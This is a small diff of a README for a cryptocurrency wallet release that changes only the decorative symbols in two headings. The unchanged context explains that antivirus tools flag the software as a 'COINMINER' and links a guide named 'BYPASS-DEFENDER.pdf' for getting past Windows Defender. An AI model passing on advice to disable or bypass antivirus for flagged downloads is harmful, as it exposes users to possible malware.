@@ -46,7 +46,7 @@ Both Wallets should auto sync via the hardcoded IP nodes and DNS Seeders. Do not
 
 You can unzip our compressed **tar.gz** folders by utilizing: https://www.7-zip.org/download.html
 
-✪ 'COINMINER' ANTIVIRUS ISSUES - DOWNLOAD ISSUES SIDENOTE
+✪ 'COINMINER' ANTIVIRUS ISSUES - DOWNLOAD ISSUES SIDENOTE ✪
 --------
 Sometimes operating systems don't like supporting cryptocurrency software due to their mining scripts and abilities.
 
@@ -78,7 +78,7 @@ Then you should be able to download and install freely. You can even activate Wi
 For a PDF menu navigation guide, see here: https://github.com/UnvsCom/Current-Wallet-Releases/blob/main/BYPASS-DEFENDER.pdf
 
 
-✪ Also remember to review our Wallet Guides at:
+✪ Also remember to review our Wallet Guides ✪
 ----------------------------------------------
 https://github.com/UnvsCom/unvs/blob/v1.2/WALLET-COMMANDS.md
 
